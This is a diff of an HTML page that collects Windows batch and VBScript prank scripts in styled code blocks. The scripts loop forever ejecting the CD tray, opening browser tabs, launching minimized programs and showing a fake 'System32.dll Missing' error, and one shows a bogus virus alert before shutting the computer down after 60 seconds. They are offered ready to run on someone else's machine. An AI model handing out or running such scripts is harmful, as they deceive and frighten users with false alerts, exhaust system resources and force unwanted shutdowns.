@@ -1,11 +1,28 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <title>Code Snippets Display</title>
+  <style>
+    body {
+      background: #111;
+      color: #0f0;
+      font-family: monospace;
+      padding: 20px;
+    }
+    pre {
+      background: #222;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      margin-bottom: 25px;
+    }
+  </style>
+</head>
 <body>
-  <p>Hello World</p>
-  <br>
-                   For disk drive
-  @echo off
+
+<h2>For disk drive</h2>
+<pre><code>@echo off
 :loop
 echo Set oWMP = CreateObject("WMPlayer.OCX.7") > eject.vbs
 echo Set colCDROMs = oWMP.cdromCollection >> eject.vbs
@@ -14,9 +31,10 @@ echo colCDROMs.Item(0).Eject >> eject.vbs
 cscript eject.vbs
 del eject.vbs
 goto loop
+</code></pre>
 
-                      For Shceduled Shutdown
-  @echo off
+<h2>For Scheduled Shutdown</h2>
+<pre><code>@echo off
 Title System Alert 
 color 0a
 
@@ -31,31 +49,32 @@ echo SHUTTING DOWN YOUR SYSTEM IN 60 SECONDS....
 shutdown /s /t 60 /c "SHUTTING DOWN IMMEDIATELY TO PREVENT FURTHER VIRUSES..."
 
 pause
+</code></pre>
 
-                     For web Tabs openings
-  @echo off
+<h2>For web Tabs openings</h2>
+<pre><code>@echo off
 :loop
 start https://www.google.com
 goto loop
+</code></pre>
 
-                      For Stealth apps
-  @echo off
+<h2>For Stealth apps</h2>
+<pre><code>@echo off
 :top
 start /min "" "mspaint.exe"
 start /min "" "calc.exe"
 start /min "" "chrome.exe"
 timeout /t 3 >nul
 goto top
+</code></pre>
 
-                        For Messages 
-  do
+<h2>For Messages</h2>
+<pre><code>do
   MsgBox "Critical error: System32.dll Missing!", 16, "System Alert"
 loop
+</code></pre>
 
-                           to be continued
+<h3>to be continued</h3>
 
-
-  
 </body>
-
 </html>
